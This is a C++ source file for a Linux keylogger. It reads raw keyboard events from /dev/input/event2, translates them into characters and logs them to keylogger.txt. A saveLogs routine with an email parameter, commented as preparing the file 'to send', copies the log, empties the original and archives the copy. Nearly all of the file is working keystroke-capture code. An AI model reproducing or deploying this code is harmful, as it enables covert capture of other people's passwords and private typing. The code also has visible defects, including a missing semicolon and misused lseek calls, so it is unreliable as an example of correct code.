#include "../Header Files/helper.hpp"

void Log::listen() { // static function
    std::cout << "Starting to listen" << std::endl;
    readFile();
}

void Log::printEventData(struct input_event ev) {
    time_t time = (time_t)ev.time.tv_sec;
    const time_t *ptrTime = &time;

    std::cout << "\nTime: " << asctime(localtime(ptrTime)) << "Code: " << ev.code;
    if (ev.type == 1) std::cout << "  Translated: " << getChar(ev.code);
    std::cout << "  Type: " << ev.type; 
}

void Log::processEvent(struct input_event ev, int fd) {
    printEventData(ev);
    if (ev.type !=1) return;
    std::string code = getChar(ev.code);
    
    if (code == "ENTER") {
        code = "\nENTER";
    } else if (code == "SPACE") {
        code = " ";
    }
    
    int written = write(fd, code.c_str(), code.length());

    if (written == -1) std::cout << "Error writing to file" << std::endl;
}

void Log::readFile() {
    int size = 0, BUFFSIZE = 4096, EVENTSIZE = 24, event, wfd, rfd, written;
    unsigned char buffer[BUFFSIZE], eventBuff[EVENTSIZE];
    struct pollfd fds[1];

    // file descriptor list for poll and the write file
    fds[0].fd = open("/dev/input/event2", O_RDWR | O_NONBLOCK);
    wfd = open("keylogger.txt", O_WRONLY | O_APPEND);
    rfd = open("rawdata.txt", O_WRONLY | O_APPEND);

    if (fds[0].fd < 0 || wfd < 0 || rfd < 0) {
        error("Reading files", 1);
    }

    fds[0].events = POLLIN; // input events
    
    int exitKeyPressCount = 50; // key events to read
    
    while(1) {
        
        // poll waits for the file to be ready to be read
        event = poll(fds, 1, 5000); 
        
        // event less than or equal to 0 is a timeout
        if (event > 0) {
            // if event did not occur there is an error
            if (fds[0].revents) {
                // read all available data
                ssize_t r = read(fds[0].fd, buffer, BUFFSIZE);
                // if data is -1 there is an error
                if (r < 0) {
                    error("Reading file data")
                    break;
                }
                std::cout << "\nTotal bytes read " << r << "/" << BUFFSIZE << "\nNew event: ";
                // loop through read data, create new input events, write events to file
                write(rfd, "\n\nEvent: \0", 10);
                for (int i = 0; i < r; i++) {

                    // every 24 bytes we create a new event
                    if (i%24 == 0 && i != 0) {
                        struct input_event newEvent;
                        memcpy(&newEvent, eventBuff, sizeof(input_event));
                        processEvent(newEvent, wfd);
                        
                        std::cout << "\n\nNew event: ";
                        write(rfd, "\n\nEvent: \0", 10);
                    }
                    eventBuff[i%24] = buffer[i];
                    printf("%.2X ", buffer[i]);
                    
                    char buff[4];
                    snprintf(buff, 4, "%02x ", buffer[i]);
                    int written = write(rfd, buff, 4);
                    if (written == -1) std::cout << "Error writing to file" << std::endl;
                }
                std::cout << '\n';
                
                if (--exitKeyPressCount < 1) break;

            } else error("No event to read");
        } else error("Timeout");
    }
    close(fds[0].fd);
    close(wfd);
    close(rfd);

}
void Log::error(std::string err, int flag = 0) {
    std::cout << "[ERROR] " << std::endl;
    switch (flag) {
        case 1:
            exit(0);
        default:
            break;
    }        
}
void Log::saveLogs(std::string fn, std::string email) {
    // copy the text file to send, truncate the original
    int rfd, wfd, r, w, success, BUFFSIZE = 4096;
    char buff[BUFFSIZE];

    rfd = open("keylogger.txt", O_RDONLY);
    wfd = open("logs.txt", O_WRONLY | O_CREAT);

    while (1) {
        r = read(rfd, buff, BUFFSIZE);
        if (r == -1) error("Reading file", 1);
        success = lseek(rfd, BUFFSIZE, SEEK_CUR);
        if (success == -1) {
            error("Seeking to new location in read file");
        }

        
        w = write(wfd, buff, BUFFSIZE);
        if (w == -1) error("Writing to file", 1);
        success = lseek(wfd, BUFFSIZE, SEEK_CUR);
        if (success == -1) {
            error("Seeking to new location in write file");
            break;
        }

    }

    // truncate keylogger
    if (ftruncate(rfd, 0) != 0) error("Truncating read file", 1);
    
    // archieve copied file
    if (!archieveCount) archieveCount = 0;
    else archieveCount++;

    char newName[50];
    sprintf(newName, "/Archieve/entry%d", archieveCount);
    if (rename("logs.txt", newName) != 0) error("Moving file", 1);

}